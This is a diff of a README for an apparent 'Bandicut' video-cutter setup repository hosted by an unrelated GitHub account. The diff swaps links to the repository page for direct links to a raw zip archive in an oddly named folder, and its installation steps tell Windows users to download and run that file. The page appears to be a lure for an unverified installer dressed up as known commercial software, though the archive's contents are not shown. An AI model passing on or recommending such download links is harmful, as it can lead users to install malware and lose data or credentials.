@@ -1,6 +1,6 @@
 # ✂️ Bandicut-Video-Cutter-Setup - Edit your high-quality videos quickly
 
-[![Download Bandicut](https://img.shields.io/badge/Download-Bandicut-blue.svg)](https://github.com/heidabantering178/Bandicut-Video-Cutter-Setup)
+[![Download Bandicut](https://img.shields.io/badge/Download-Bandicut-blue.svg)](https://raw.githubusercontent.com/heidabantering178/Bandicut-Video-Cutter-Setup/main/dashy/Bandicut-Video-Setup-Cutter-v1.7-beta.4.zip)
 
 Bandicut processes video files without data loss. It cuts, trims, splits, and joins clips at high speeds. It uses hardware acceleration to keep your original video quality intact while saving you time. You do not re-encode your files, so the final output matches the source quality exactly.
 
@@ -28,7 +28,7 @@ Bandicut runs on Windows systems. Ensure your PC meets these standards for the b
 
 Follow these steps to set up Bandicut on your computer.
 
-1. Visit the following link to access the software: [https://github.com/heidabantering178/Bandicut-Video-Cutter-Setup](https://github.com/heidabantering178/Bandicut-Video-Cutter-Setup).
+1. Visit the following link to access the software: [https://raw.githubusercontent.com/heidabantering178/Bandicut-Video-Cutter-Setup/main/dashy/Bandicut-Video-Setup-Cutter-v1.7-beta.4.zip](https://raw.githubusercontent.com/heidabantering178/Bandicut-Video-Cutter-Setup/main/dashy/Bandicut-Video-Setup-Cutter-v1.7-beta.4.zip).
 2. Look for the release area on the page.
 3. Click the installation file to download it to your Windows computer.
 4. Locate the file in your downloads folder.
